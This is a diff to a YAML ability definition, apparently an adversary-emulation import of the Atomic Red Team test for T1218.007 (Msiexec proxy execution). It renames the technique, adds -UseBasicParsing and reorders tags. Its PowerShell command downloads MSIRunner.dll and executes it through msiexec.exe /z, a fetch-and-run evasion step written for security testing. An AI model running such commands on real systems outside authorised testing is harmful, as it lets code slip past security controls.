@@ -6,7 +6,7 @@
   tactic: stealth
   technique:
     attack_id: T1218.007
-    name: 'Signed Binary Proxy Execution: Msiexec'
+    name: 'System Binary Proxy Execution: Msiexec'
   platforms:
     windows:
       sh:
@@ -14,17 +14,17 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll") -ErrorAction ignore |
           Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll
-          -OutFile "PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll"; fi; c:\windows\system32\msiexec.exe
-          /z "PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll"'
+          -OutFile "PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll" -UseBasicParsing;
+          fi; c:\windows\system32\msiexec.exe /z "PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll"'
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - t1218.007
-  - atomic-red-team
   - stealth
+  - atomic-red-team
+  - t1218.007
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -47,9 +47,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll
-        -OutFile "#{dll_payload}"
+        -OutFile "#{dll_payload}" -UseBasicParsing
 
         '
     technique_created: '2020-01-24T14:38:49.266Z'
     atomic_guid: ab09ec85-4955-4f9c-b8e0-6851baf4d47f
-    import_timestamp: '2026-10-20T07:08:26.470188Z'
+    import_timestamp: '2026-10-21T07:01:49.251275Z'
